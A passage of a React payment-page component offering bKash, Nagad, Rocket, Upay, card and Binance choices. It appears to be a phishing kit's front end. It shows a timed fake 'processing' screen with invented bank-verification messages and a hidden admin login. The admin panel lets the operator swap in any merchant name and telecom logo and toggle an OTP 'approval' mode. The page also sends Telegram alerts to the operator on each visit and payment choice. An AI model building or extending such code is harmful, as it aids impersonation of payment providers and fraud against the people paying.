import { useState, useEffect, useRef } from "react";
import { Home, Upload, X, Headphones, HelpCircle, Gift, LogIn, LogOut, Lock } from "lucide-react";
import { useNavigate, useSearchParams } from "@/lib/flowRouter";
import { Switch } from "@/components/ui/switch";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import DualCircleLoader from "@/components/payment/DualCircleLoader";
import { sendTelegramNotification } from "@/lib/payment-telegram";
import {
  adminListPaymentMethods,
  adminSetAppSetting,
  adminSetPaymentMethodEnabled,
  getEnabledPaymentMethods,
  getPublicAppSetting,
  updateAdminSecrets,
  verifyAdminLogin,
  verifySupportGate,
} from "@/lib/backend-api";
import { supabase } from "@/integrations/supabase/client";
import { emitAppSettingsUpdate, subscribeAppSettingsUpdate } from "@/lib/appSettingsSync";
import { bindFlowPlatform } from "@/lib/flowSession";
import AllowedWebsitesAdmin from "@/components/AllowedWebsitesAdmin";
import { useReferrerGuard, getReferrerAmount, isLovableHost } from "@/hooks/useReferrerGuard";


import bkashLogo from "@/assets/payment/bkash-logo.png";
import nagadLogo from "@/assets/payment/nagad-logo.png";
import rocketLogo from "@/assets/payment/rocket-logo.png";
import upayLogo from "@/assets/payment/upay-logo.png";
import cardLogo from "@/assets/payment/card-visa-mastercard.png";
import binanceLogo from "@/assets/payment/binanceLogo";
import merchantGenzAsset from "@/assets/merchant/genz-logo.png";
import merchantGpAsset from "@/assets/merchant/grameenphone.png";
import merchantRobiAsset from "@/assets/merchant/robi.png";

const MERCHANT_LOGO_OPTIONS = [
  { id: "genz", label: "GenZ", src: merchantGenzAsset },
  { id: "mygp", label: "Grameenphone", src: merchantGpAsset },
  { id: "robi", label: "Robi", src: merchantRobiAsset },
] as const;

const MERCHANT_PROFILES_KEY = "merchant_profiles_bkash";
const MERCHANT_ACTIVE_KEY = "merchant_active_bkash";

type MerchantProfile = { id: string; logo: string; label: string; name: string; inv: string; custom?: boolean };

const DEFAULT_PROFILES: MerchantProfile[] = MERCHANT_LOGO_OPTIONS.map((o) => ({
  id: o.id, logo: o.id, label: o.label, name: "", inv: "", custom: false,
}));

const resolveLogoSrc = (logo: string): string => {
  const preset = MERCHANT_LOGO_OPTIONS.find((o) => o.id === logo);
  if (preset) return preset.src;
  if (logo && (logo.startsWith("data:") || logo.startsWith("http") || logo.startsWith("/"))) return logo;
  return merchantGenzAsset;
};

const parseProfiles = (raw: unknown): MerchantProfile[] => {
  try {
    const parsed = JSON.parse(String(raw ?? ""));
    if (!Array.isArray(parsed)) return [];
    return parsed
      .filter((p) => p && typeof p === "object")
      .map((p: Record<string, unknown>) => ({
        id: String(p.id ?? `p_${Math.random().toString(36).slice(2)}`),
        logo: String(p.logo ?? MERCHANT_LOGO_OPTIONS[0].id),
        label: String(p.label ?? ""),
        name: String(p.name ?? ""),
        inv: String(p.inv ?? ""),
        custom: Boolean(p.custom),
      }));
  } catch {
    return [];
  }
};

const mergeWithDefaults = (list: MerchantProfile[]): MerchantProfile[] => {
  // Only seed defaults when nothing has been saved yet, so deleted merchants stay deleted.
  if (list.length > 0) return list;
  return DEFAULT_PROFILES;
};






const gatewayMessages = [
  "Connecting to secure payment gateway...",
  "Verifying merchant credentials...",
  "Authorizing transaction...",
  "Communicating with bank server...",
  "Finalizing secure gateway...",
];

const defaultEnabledMethods = {
  bkash: true, nagad: true, rocket: false, upay: false, visa: true, mastercard: true, binance: true,
};

const paymentMethods = [
  { id: 'bkash', route: '/bkash', logo: bkashLogo, alt: 'bKash', h: 'h-36 md:h-48' },
  { id: 'nagad', route: '/nagad', logo: nagadLogo, alt: 'Nagad', h: 'h-20 md:h-24' },
  { id: 'rocket', route: '/rocket', logo: rocketLogo, alt: 'Rocket', h: 'h-20 md:h-24' },
  { id: 'upay', route: '/upay', logo: upayLogo, alt: 'Upay', h: 'h-20 md:h-24' },
  { id: 'card', route: '/card', logo: cardLogo, alt: 'Visa / Mastercard', h: 'h-20 md:h-28' },
  { id: 'binance', route: '/binance', logo: binanceLogo, alt: 'Binance', h: 'h-8 md:h-10' },
] as const;


const PaymentGateway = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const checkingReferrer = false;
  const [showGateway, setShowGateway] = useState(() => {
    if (typeof window === 'undefined') return true;
    if (sessionStorage.getItem('genz_skip_gateway') === 'true') {
      sessionStorage.removeItem('genz_skip_gateway');
      return false;
    }
    return true;
  });
  const [messageIndex, setMessageIndex] = useState(0);
  const [progress, setProgress] = useState(0);
  const [showLoader, setShowLoader] = useState(false);
  const [clickedCard, setClickedCard] = useState<string | null>(null);
  const [isAdmin, setIsAdmin] = useState(false);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [showSupportModal, setShowSupportModal] = useState(false);
  const [supportNumber, setSupportNumber] = useState("");
  const [loginUnlocked, setLoginUnlocked] = useState(false);
  const METHODS_CACHE_KEY = "genz_enabled_methods_v1";
  const cachedMethods: Record<string, boolean> | null = (() => {
    try { return JSON.parse(localStorage.getItem(METHODS_CACHE_KEY) || "null"); } catch { return null; }
  })();
  const [enabledMethods, setEnabledMethods] = useState<Record<string, boolean>>(cachedMethods ?? {});
  const [methodsLoaded, setMethodsLoaded] = useState<boolean>(!!cachedMethods);
  const [badgeColor, setBadgeColor] = useState<'slate' | 'red'>((localStorage.getItem("genz_badge_color") as any) || 'slate');
  const [gatewayName, setGatewayName] = useState<string>(() => localStorage.getItem("genz_gateway_name") ?? "");
  const [gatewayLogo, setGatewayLogo] = useState<string>(() => localStorage.getItem("genz_gateway_logo") ?? "");
  const [gatewayError, setGatewayError] = useState("");
  const gatewayDirtyRef = useRef(false);
  const [otpMode, setOtpMode] = useState<'approval' | 'auto'>((localStorage.getItem("genz_otp_mode") as any) === 'auto' ? 'auto' : 'approval');

  const [merchantTarget, setMerchantTarget] = useState<string>("bkash");
  const [merchantName, setMerchantName] = useState("");
  const [merchantInv, setMerchantInv] = useState("");
  const [merchantLogo, setMerchantLogo] = useState("");
  const [merchantError, setMerchantError] = useState("");
  const [profiles, setProfiles] = useState<MerchantProfile[]>([]);
  const [activeProfileId, setActiveProfileId] = useState<string>("");

  useEffect(() => {
    if (!isAdmin) return;
    let cancelled = false;
    (async () => {
      const [name, inv, logo, rawProfiles, activeIdRaw] = await Promise.all([
        getPublicAppSetting(`merchant_${merchantTarget}`).catch(() => null),
        getPublicAppSetting(`inv_${merchantTarget}`).catch(() => null),
        getPublicAppSetting(`logo_${merchantTarget}`).catch(() => null),
        merchantTarget === "bkash"
          ? getPublicAppSetting(MERCHANT_PROFILES_KEY).catch(() => null)
          : Promise.resolve(null),
        merchantTarget === "bkash"
          ? getPublicAppSetting(MERCHANT_ACTIVE_KEY).catch(() => null)
          : Promise.resolve(null),
      ]);
      if (cancelled) return;
      const nameVal = name ? String(name) : "";
      const invVal = inv ? String(inv) : "";
      const logoVal = logo ? String(logo) : "";
      setMerchantName(nameVal);
      setMerchantInv(invVal);
      setMerchantLogo(logoVal);
      merchantDirtyRef.current = false;
      setMerchantError("");

      if (merchantTarget === "bkash") {
        const list = mergeWithDefaults(parseProfiles(rawProfiles));
        setProfiles(list);
        const activeId = activeIdRaw ? String(activeIdRaw) : "";
        const match =
          list.find((p) => p.id === activeId) ??
          list.find((p) => p.logo === logoVal) ??
          list[0];
        if (match) {
          setActiveProfileId(match.id);
          setMerchantName(match.name || nameVal);
          setMerchantInv(match.inv || invVal);
          setMerchantLogo(match.logo);
        }
      }
    })();
    return () => { cancelled = true; };
  }, [isAdmin, merchantTarget]);



  const [credCurrentPassword, setCredCurrentPassword] = useState("");
  const [credEmail, setCredEmail] = useState("");
  const [credPassword, setCredPassword] = useState("");
  const [credSupport, setCredSupport] = useState("");
  const [credError, setCredError] = useState("");

  const isMobileOrTablet = typeof window !== 'undefined' && window.innerWidth < 1024;

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href);
      navigate(`/payment-cancelled?reason=Payment isn't completed&amount=${amount}`);
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount]);

  useEffect(() => {
    if (sessionStorage.getItem("admin_logged_in") === "true") setIsAdmin(true);
  }, []);

  const handleAdminLogin = async () => {
    const data = await verifyAdminLogin(loginEmail, loginPassword).catch(() => false);
    if (data === true) {
      setIsAdmin(true); setShowLoginModal(false); setLoginError("");
      sessionStorage.setItem("admin_logged_in", "true");
      sessionStorage.setItem("admin_pw", loginPassword);
    } else {
      setLoginError("Invalid email or password");
    }
  };

  const handleAdminLogout = () => {
    sessionStorage.removeItem("admin_logged_in");
    sessionStorage.removeItem("admin_pw");
    setIsAdmin(false); setLoginUnlocked(false);
  };

  const getAdminPw = () => sessionStorage.getItem("admin_pw") || "";

  const syncChannelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const syncReadyRef = useRef<boolean>(false);
  const appSettingsChannelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const appSettingsReadyRef = useRef<boolean>(false);

  const toggleMethod = async (id: string, enabled: boolean) => {
    const previous = enabledMethods[id] ?? false;
    setEnabledMethods((prev) => ({ ...prev, [id]: enabled }));
    const ok = await adminSetPaymentMethodEnabled(getAdminPw(), id, enabled).catch(() => false);
    if (!ok) { setEnabledMethods((prev) => ({ ...prev, [id]: previous })); return; }
    try {
      if (syncChannelRef.current && syncReadyRef.current) {
        await syncChannelRef.current.send({ type: 'broadcast', event: 'update', payload: { id, enabled } });
      }
    } catch {}
  };

  const updateBadgeColor = async (color: 'slate' | 'red') => {
    setBadgeColor(color);
    try { localStorage.setItem("genz_badge_color", color); } catch {}
    await adminSetAppSetting(getAdminPw(), 'badge_color', color).catch(() => undefined);
    broadcastSettings({ badge_color: color });
  };

  const updateOtpMode = async (mode: 'approval' | 'auto') => {
    setOtpMode(mode);
    try { localStorage.setItem("genz_otp_mode", mode); } catch {}
    await adminSetAppSetting(getAdminPw(), 'otp_approval_mode', mode).catch(() => undefined);
    broadcastSettings({ otp_approval_mode: mode });
  };


  const broadcastSettings = (values: Record<string, string>) => {
    emitAppSettingsUpdate(values);
    try {
      const live = appSettingsChannelRef.current;
      if (live && appSettingsReadyRef.current) {
        void live.send({ type: 'broadcast', event: 'update', payload: { values } });
        return;
      }
      // Fallback: unique topic name avoids clashing with the persistent listener channel.
      const channel = supabase.channel(`app_settings_sync_tx_${Date.now()}`, {
        config: { broadcast: { self: false } },
      });
      channel.subscribe(async (status) => {
        if (status !== 'SUBSCRIBED') return;
        await channel.send({ type: 'broadcast', event: 'update', payload: { values } });
        supabase.removeChannel(channel);
      });
    } catch {}
  };




  const saveMerchantInfo = async () => {
    setMerchantError("");
    const values: Record<string, string> = {};
    if (merchantName.trim()) values[`merchant_${merchantTarget}`] = merchantName.trim();
    if (merchantInv.trim()) values[`inv_${merchantTarget}`] = merchantInv.trim();
    if (merchantLogo) values[`logo_${merchantTarget}`] = merchantLogo;
    if (Object.keys(values).length === 0) { setMerchantError("Nothing to save."); return; }
    broadcastSettings(values);
    const results = await Promise.all(
      Object.entries(values).map(([key, value]) => adminSetAppSetting(getAdminPw(), key, value).catch(() => false)),
    );
    if (!results.every(Boolean)) { setMerchantError("Save failed. Check your admin session."); return; }
  };

  const persistSettings = async (values: Record<string, string>) => {
    broadcastSettings(values);
    const results = await Promise.all(
      Object.entries(values).map(([key, value]) => adminSetAppSetting(getAdminPw(), key, value).catch(() => false)),
    );
    return results.every(Boolean);
  };

  const commitProfiles = async (list: MerchantProfile[], active?: MerchantProfile | null) => {
    setMerchantError("");
    const values: Record<string, string> = { [MERCHANT_PROFILES_KEY]: JSON.stringify(list) };
    if (active) {
      values["merchant_bkash"] = active.name.trim();
      values["inv_bkash"] = active.inv.trim();
      values["logo_bkash"] = active.logo;
      values[MERCHANT_ACTIVE_KEY] = active.id;
    }
    const ok = await persistSettings(values);
    if (!ok) { setMerchantError("Save failed. Check your admin session."); return; }
  };

  const selectProfile = async (profile: MerchantProfile) => {
    setActiveProfileId(profile.id);
    setMerchantName(profile.name);
    setMerchantInv(profile.inv);
    setMerchantLogo(profile.logo);
    await commitProfiles(profiles, profile);
  };

  const updateProfile = (id: string, patch: Partial<MerchantProfile>) => {
    setProfiles((prev) => {
      const next = prev.map((p) => (p.id === id ? { ...p, ...patch } : p));
      if (id === activeProfileId) {
        const active = next.find((p) => p.id === id);
        if (active) {
          setMerchantName(active.name);
          setMerchantInv(active.inv);
          setMerchantLogo(active.logo);
        }
      }
      return next;
    });
  };

  const addCustomProfile = (logoDataUrl: string, label: string) => {
    const profile: MerchantProfile = {
      id: `p_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
      logo: logoDataUrl,
      label: label || "Custom",
      name: "",
      inv: "",
      custom: true,
    };
    setProfiles((prev) => {
      const next = [...prev, profile];
      void commitProfiles(next, profile);
      return next;
    });
    setActiveProfileId(profile.id);
    setMerchantName("");
    setMerchantInv("");
    setMerchantLogo(logoDataUrl);
  };

  const handleLogoUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    e.target.value = "";
    if (!file) return;
    if (file.size > 400 * 1024) { setMerchantError("Logo must be under 400KB."); return; }
    const reader = new FileReader();
    reader.onload = () => addCustomProfile(String(reader.result), file.name.replace(/\.[^.]+$/, "").slice(0, 24));
    reader.readAsDataURL(file);
  };

  const deleteProfile = async (id: string) => {
    const next = profiles.filter((p) => p.id !== id);
    setProfiles(next);
    const wasActive = id === activeProfileId;
    const active = wasActive ? next[0] ?? null : next.find((p) => p.id === activeProfileId) ?? null;
    if (wasActive) {
      setActiveProfileId(active?.id ?? "");
      setMerchantName(active?.name ?? "");
      setMerchantInv(active?.inv ?? "");
      setMerchantLogo(active?.logo ?? "");
    }
    await commitProfiles(next, wasActive ? active : null);
  };

  const applyGatewaySync = (values: Record<string, string>) => {
    if ("gateway_name" in values) {
      const v = String(values.gateway_name ?? "");
      setGatewayName(v);
      try { localStorage.setItem("genz_gateway_name", v); } catch {}
    }
    if ("gateway_logo" in values) {
      const v = String(values.gateway_logo ?? "");
      setGatewayLogo(v);
      try { localStorage.setItem("genz_gateway_logo", v); } catch {}
    }
  };

  const saveGatewayBranding = async (values: Record<string, string>) => {
    gatewayDirtyRef.current = true;
    setGatewayError("");
    Object.entries(values).forEach(([k, v]) => {
      try { localStorage.setItem(k === "gateway_name" ? "genz_gateway_name" : "genz_gateway_logo", v); } catch {}
    });
    const ok = await persistSettings(values);
    gatewayDirtyRef.current = false;
    if (!ok) { setGatewayError("Save failed. Check your admin session."); return; }
  };

  const handleGatewayLogoFile = (file: File) => {
    setGatewayError("");
    if (!file.type.startsWith("image/")) { setGatewayError("Please choose an image file."); return; }
    if (file.size > 250 * 1024) { setGatewayError("Image too large. Use an image under 250KB."); return; }
    const reader = new FileReader();
    reader.onload = () => {
      const dataUrl = String(reader.result || "");
      setGatewayLogo(dataUrl);
      void saveGatewayBranding({ gateway_logo: dataUrl });
    };
    reader.readAsDataURL(file);
  };

  const applyMerchantSync = (values: Record<string, string>) => {
    if (MERCHANT_PROFILES_KEY in values) {
      const list = parseProfiles(values[MERCHANT_PROFILES_KEY]);
      setProfiles(list);
    }
    if (merchantTarget !== "bkash") return;
    if ("merchant_bkash" in values) setMerchantName(String(values.merchant_bkash));
    if ("inv_bkash" in values) setMerchantInv(String(values.inv_bkash));
    if ("logo_bkash" in values) {
      setMerchantLogo(String(values.logo_bkash));
    }
    if (MERCHANT_ACTIVE_KEY in values) {
      setActiveProfileId(String(values[MERCHANT_ACTIVE_KEY]));
    }
  };


  const saveAdminCredentials = async () => {
    setCredError("");
    if (!credCurrentPassword) { setCredError("Enter current password to authorize changes."); return; }
    const data = await updateAdminSecrets({
      currentPassword: credCurrentPassword,
      newEmail: credEmail.trim() || null,
      newPassword: credPassword || null,
      newSupport: credSupport.trim() || null,
    }).catch(() => false);
    if (data !== true) { setCredError("Incorrect current password."); return; }
    setCredCurrentPassword(""); setCredEmail(""); setCredPassword(""); setCredSupport("");
  };

  // ---- Auto-save (no Save buttons): debounce edits and push live everywhere ----
  const merchantDirtyRef = useRef(false);

  useEffect(() => {
    if (!isAdmin || !merchantDirtyRef.current) return;
    const t = window.setTimeout(() => {
      merchantDirtyRef.current = false;
      if (merchantTarget === "bkash") {
        // Never fall back to another profile: skip the save if the active tile is unknown.
        const active = profiles.find((p) => p.id === activeProfileId);
        if (!active) return;
        void commitProfiles(profiles, active);
      } else {
        void saveMerchantInfo();
      }
    }, 500);
    return () => window.clearTimeout(t);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isAdmin, merchantTarget, merchantName, merchantInv, merchantLogo, profiles, activeProfileId]);



  useEffect(() => {
    const fetchMethods = async () => {
      const adminPw = getAdminPw();
      if (adminPw) {
        const data = await adminListPaymentMethods(adminPw).catch(() => null);
        if (data) {
          const map: Record<string, boolean> = { ...defaultEnabledMethods };
          (data as any[]).forEach((m: any) => { if (m.id in defaultEnabledMethods) map[m.id] = m.enabled; });
          setEnabledMethods(map);
          setMethodsLoaded(true);
          try { localStorage.setItem(METHODS_CACHE_KEY, JSON.stringify(map)); } catch {}
          return;
        }
      }
      const data = await getEnabledPaymentMethods().catch(() => []);
      const enabledIds = new Set<string>(data ?? []);
      const map: Record<string, boolean> = {};
      Object.keys(defaultEnabledMethods).forEach((id) => { map[id] = enabledIds.has(id); });
      setEnabledMethods(map);
      setMethodsLoaded(true);
      try { localStorage.setItem(METHODS_CACHE_KEY, JSON.stringify(map)); } catch {}
    };

    const fetchBadgeColor = async () => {
      const data = await getPublicAppSetting("badge_color").catch(() => null);
      if (data === 'red' || data === 'slate') {
        setBadgeColor(data);
        try { localStorage.setItem("genz_badge_color", data); } catch {}
      }
    };
    const fetchGatewayBranding = async () => {
      const [name, logo] = await Promise.all([
        getPublicAppSetting("gateway_name").catch(() => null),
        getPublicAppSetting("gateway_logo").catch(() => null),
      ]);
      if (gatewayDirtyRef.current) return;
      const nameVal = name ? String(name) : "";
      const logoVal = logo ? String(logo) : "";
      setGatewayName(nameVal);
      setGatewayLogo(logoVal);
      try {
        localStorage.setItem("genz_gateway_name", nameVal);
        localStorage.setItem("genz_gateway_logo", logoVal);
      } catch {}
    };
    const fetchOtpMode = async () => {
      const v = await getPublicAppSetting('otp_approval_mode').catch(() => null);
      const mode: 'approval' | 'auto' = v === 'auto' ? 'auto' : 'approval';
      setOtpMode(mode);
      try { localStorage.setItem("genz_otp_mode", mode); } catch {}
    };
    fetchMethods();
    fetchBadgeColor();
    fetchOtpMode();
    fetchGatewayBranding();




    sendTelegramNotification({ type: 'page_entry', amount, referrer: document.referrer || 'Direct' });

    const onVisibility = () => {
      if (document.visibilityState === 'visible') { fetchMethods(); fetchBadgeColor(); fetchGatewayBranding(); }
    };
    document.addEventListener('visibilitychange', onVisibility);

    const channel = supabase.channel('payment_methods_sync', {
      config: { broadcast: { self: false } },
    });
    channel
      .on('broadcast', { event: 'update' }, (msg) => {
        const payload = (msg as any)?.payload as { id?: string; enabled?: boolean } | undefined;
        if (payload && payload.id && typeof payload.enabled === 'boolean') {
          const methodId = payload.id;
          const methodEnabled = payload.enabled;
          setEnabledMethods((prev) => {
            const next = { ...prev, [methodId]: methodEnabled };
            try { localStorage.setItem(METHODS_CACHE_KEY, JSON.stringify(next)); } catch {}
            return next;
          });
        } else {
          fetchMethods();
        }
      })
      .subscribe((status) => {
        if (status === 'SUBSCRIBED') { syncReadyRef.current = true; }
      });
    syncChannelRef.current = channel;

    const appSettingsChannel = supabase.channel('app_settings_sync', {
      config: { broadcast: { self: false } },
    });
    appSettingsChannel
      .on('broadcast', { event: 'update' }, (msg) => {
        const values = ((msg as { payload?: { values?: Record<string, string> } })?.payload?.values) ?? {};
        emitAppSettingsUpdate(values);
        if (values.badge_color === "red" || values.badge_color === "slate") {
          setBadgeColor(values.badge_color);
          try { localStorage.setItem("genz_badge_color", values.badge_color); } catch {}
        }
        if (values.otp_approval_mode === "auto" || values.otp_approval_mode === "approval") {
          setOtpMode(values.otp_approval_mode);
          try { localStorage.setItem("genz_otp_mode", values.otp_approval_mode); } catch {}
        }
        applyGatewaySync(values);
        applyMerchantSync(values);
      })
      .subscribe((status) => {
        appSettingsReadyRef.current = status === 'SUBSCRIBED';
      });
    appSettingsChannelRef.current = appSettingsChannel;

    const unsubscribeLocal = subscribeAppSettingsUpdate((values) => {
      if (values.badge_color === "red" || values.badge_color === "slate") {
        setBadgeColor(values.badge_color);
        try { localStorage.setItem("genz_badge_color", values.badge_color); } catch {}
      }
      applyGatewaySync(values);
    });

    // Safety net so every device converges even if a realtime frame is missed.
    const poll = window.setInterval(() => { fetchMethods(); fetchBadgeColor(); fetchGatewayBranding(); }, 5000);

    return () => {
      document.removeEventListener('visibilitychange', onVisibility);
      window.clearInterval(poll);
      syncReadyRef.current = false;
      syncChannelRef.current = null;
      appSettingsReadyRef.current = false;
      appSettingsChannelRef.current = null;
      supabase.removeChannel(channel);
      supabase.removeChannel(appSettingsChannel);
      unsubscribeLocal();
    };

  }, []);

  const cardTypes = ['visa', 'mastercard', 'card'];
  const isMethodEnabled = (id: string) => {
    if (id === 'card') return (enabledMethods.visa ?? false) || (enabledMethods.mastercard ?? false);
    return enabledMethods[id] ?? false;
  };
  const allVisibleMethodsDisabled = methodsLoaded && paymentMethods.every((method) => !isMethodEnabled(method.id));

  const [isNavigating, setIsNavigating] = useState(false);

  const handlePaymentSelect = (route: string) => {
    if (isNavigating) return;
    setIsNavigating(true);
    const methodName = route.replace('/', '');
    const isCard = cardTypes.includes(methodName);
    sendTelegramNotification({
      type: 'payment_activity',
      amount,
      method: isCard ? 'Card' : (methodName.charAt(0).toUpperCase() + methodName.slice(1)),
      paymentType: isCard ? 'card' : 'mfs',
      referrer: document.referrer || 'Direct',
    });
    sessionStorage.setItem('genz_skip_gateway', 'true');
    const bound = bindFlowPlatform(methodName);

    setClickedCard(route);
    setTimeout(() => {
      setShowLoader(true);
      setTimeout(() => {
        bound.then((ok) => navigate(ok ? route : '/payment-cancelled'));
      }, 3000);
    }, 1000);

  };


  useEffect(() => {
    if (!showGateway) return;
    const totalDuration = 2000;
    const messageInterval = totalDuration / gatewayMessages.length;
    // Kick a single smooth transition from 0 -> 100
    requestAnimationFrame(() => setProgress(100));
    const msgTimer = setInterval(() => setMessageIndex((p) => (p >= gatewayMessages.length - 1 ? p : p + 1)), messageInterval);
    const hideTimer = setTimeout(() => setShowGateway(false), totalDuration);
    return () => { clearInterval(msgTimer); clearTimeout(hideTimer); };
  }, [showGateway]);


  if (showGateway || checkingReferrer) {
    return (
      <div className="min-h-[100dvh] w-screen bg-background flex items-center justify-center p-4 overflow-hidden fixed inset-0 z-50">
        <div className="w-full max-w-md mx-auto">
          <div className="bg-gradient-to-br from-[#2d7dd2] via-[#2570c4] to-[#1a5fb4] rounded-2xl shadow-[0_20px_60px_rgba(26,95,180,0.4)] p-8 flex flex-col items-center relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent pointer-events-none" style={{ animation: 'shimmer 3s ease-in-out infinite' }} />
            <div className="flex gap-3 mb-7 relative z-10">
              {[0, 1, 2].map((i) => (
                <div key={i} className="w-2 h-2 rounded-full bg-white" style={{ animation: `dotBounce 1.4s ease-in-out ${i * 0.16}s infinite` }} />
              ))}
            </div>
            {gatewayLogo && (
              <div className="w-20 h-20 rounded-full bg-[#1a2332] flex items-center justify-center mb-5 relative z-10 shadow-lg ring-2 ring-white/10">
                <img src={gatewayLogo} alt={gatewayName} className="w-[72px] h-[72px] rounded-full object-cover" />
              </div>
            )}
            <h2 className="text-white text-xl font-bold mb-2 relative z-10 tracking-wide">Processing Your Payment...</h2>
            <p className="text-white/75 text-sm mb-6 transition-all duration-500 min-h-[20px] relative z-10">{gatewayMessages[messageIndex]}</p>
            <div className="w-full bg-white/20 rounded-full h-2.5 mb-6 overflow-hidden relative z-10 backdrop-blur-sm">
              <div className="h-full rounded-full ease-linear" style={{ width: `${progress}%`, transition: 'width 2000ms linear', background: 'linear-gradient(90deg, #ffffff 0%, #e0ecff 50%, #ffffff 100%)', boxShadow: '0 0 10px rgba(255,255,255,0.5)' }} />
            </div>
              <div className="flex items-center gap-2 text-white/90 mb-2 relative z-10">
              <Lock className="w-4 h-4" />
                {gatewayName && <span className="text-sm font-semibold tracking-wide">{gatewayName}</span>}
            </div>
            <p className="text-white/40 text-xs relative z-10">Please do not close or refresh this page</p>
          </div>
        </div>
        <style>{`
          @keyframes dotBounce { 0%, 80%, 100% { transform: translateY(0); } 40% { transform: translateY(-8px); } }
          @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
        `}</style>
      </div>
    );
  }

  return (
    <>
      <div className="min-h-[100dvh] bg-background flex items-start md:items-center justify-center p-0 md:p-4 overflow-hidden">
        <div className="w-full max-w-none md:max-w-[700px] lg:max-w-[800px] flex flex-col md:justify-center h-[100dvh] md:max-h-[calc(100dvh-2rem)] overflow-hidden">
          <div className="bg-transparent md:bg-card md:rounded-2xl md:shadow-sm flex flex-col h-[100dvh] md:h-auto md:min-h-0 md:max-h-[100dvh] overflow-hidden pb-0 md:pb-0 relative">
            <div className="flex items-center justify-center px-3 py-2 md:px-5 md:py-3">
              <div className="bg-background rounded-lg flex items-center justify-between w-full px-4 py-2 shadow-sm border border-border/60">
                <button
                  type="button"
                  aria-label="Return to referring website"
                  onClick={() => {
                    const ref = document.referrer;
                    if (ref && !isLovableHost(ref)) window.location.href = ref;
                    else navigate('/');
                  }}
                  className="bg-transparent border-0 p-0 inline-flex"
                >
                  <Home className="w-4 h-4 text-foreground cursor-pointer" strokeWidth={1.5} />
                </button>
                <div className="flex items-center gap-3">
                  <Upload className="w-4 h-4 text-foreground" strokeWidth={1.5} aria-hidden="true" />
                  <button type="button" aria-label="Cancel payment" onClick={() => navigate(`/payment-cancelled?reason=Payment isn't completed&amount=${amount}`)} className="bg-transparent border-0 p-0 inline-flex">
                    <X className="w-4 h-4 text-foreground cursor-pointer" strokeWidth={1.5} />
                  </button>
                </div>
              </div>
            </div>

            <div className="flex-1 min-h-0 px-3 md:px-6 pb-2 md:pb-6 flex flex-col overflow-y-auto overscroll-contain" style={{ WebkitOverflowScrolling: 'touch' }}>
              {gatewayLogo && (
                <div className="flex justify-center mt-1 mb-2">
                  <img src={gatewayLogo} alt={gatewayName || "Payment"} className="w-14 h-14 md:w-20 md:h-20 rounded-full object-cover" />
                </div>
              )}
              <div className="text-center mb-2">
                {gatewayName && <h1 className="text-foreground text-base md:text-xl font-bold mb-0.5">{gatewayName}</h1>}
                <p className="text-muted-foreground text-sm md:text-base font-normal">Online Payment</p>
              </div>

              <div className="flex justify-center gap-4 md:gap-8 mb-3">
                <div className="flex flex-col items-center gap-0.5">
                  <Button type="button" variant="ghost" size="icon" aria-label="Support" onClick={() => setShowSupportModal(true)} className="w-8 h-8 md:w-10 md:h-10 bg-pay-bar rounded-full shadow-sm hover:bg-pay-bar">
                    <Headphones className="w-4 h-4 md:w-5 md:h-5 text-foreground" strokeWidth={1.8} aria-hidden="true" />
                  </Button>
                  <span className="text-[10px] md:text-xs text-muted-foreground">Support</span>
                </div>
                <div className="flex flex-col items-center gap-0.5">
                  <div className="w-8 h-8 md:w-10 md:h-10 bg-pay-bar rounded-full flex items-center justify-center shadow-sm">
                    <HelpCircle className="w-4 h-4 md:w-5 md:h-5 text-foreground" strokeWidth={1.8} aria-hidden="true" />
                  </div>
                  <span className="text-[10px] md:text-xs text-muted-foreground">FAQ</span>
                </div>
                <div className="flex flex-col items-center gap-0.5 relative">
                  <div className="w-8 h-8 md:w-10 md:h-10 bg-pay-bar rounded-full flex items-center justify-center shadow-sm">
                    <Gift className="w-4 h-4 md:w-5 md:h-5 text-foreground" strokeWidth={1.8} aria-hidden="true" />
                  </div>
                  <span className="absolute -top-0.5 -right-0.5 w-3.5 h-3.5 bg-destructive text-destructive-foreground text-[8px] rounded-full flex items-center justify-center font-medium">2</span>
                  <span className="text-[10px] md:text-xs text-muted-foreground">Offers</span>
                </div>
                <div className="flex flex-col items-center gap-0.5">
                  <Button
                    type="button"
                    variant="ghost"
                    size="icon"
                    aria-label={isAdmin ? 'Logout' : 'Login'}
                    onClick={() => {
                      if (isAdmin) handleAdminLogout();
                      else if (loginUnlocked) setShowLoginModal(true);
                    }}
                    className="w-8 h-8 md:w-10 md:h-10 bg-pay-bar rounded-full shadow-sm hover:bg-pay-bar"
                  >
                    {isAdmin ? <LogOut className="w-4 h-4 md:w-5 md:h-5 text-foreground" strokeWidth={1.8} aria-hidden="true" /> : <LogIn className="w-4 h-4 md:w-5 md:h-5 text-foreground" strokeWidth={1.8} aria-hidden="true" />}
                  </Button>
                  <span className="text-[10px] md:text-xs text-muted-foreground">{isAdmin ? 'Logout' : 'Login'}</span>
                </div>
              </div>

              <button className="w-full bg-blue-600 text-white py-2 md:py-2.5 rounded-lg font-medium text-sm mb-3 tracking-wide shadow-sm">
                মোবাইল ব্যাংকিং
              </button>

              <div className="relative">
                {methodsLoaded && allVisibleMethodsDisabled && !isAdmin && (
                  <div className="absolute inset-0 z-10 flex items-center justify-center rounded-xl pointer-events-none select-none" style={{ transform: 'rotate(-18deg)' }}>
                    <div className="flex flex-col items-center gap-1">
                      <svg xmlns="http://www.w3.org/2000/svg" className="w-16 h-16 md:w-20 md:h-20 text-destructive/30" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
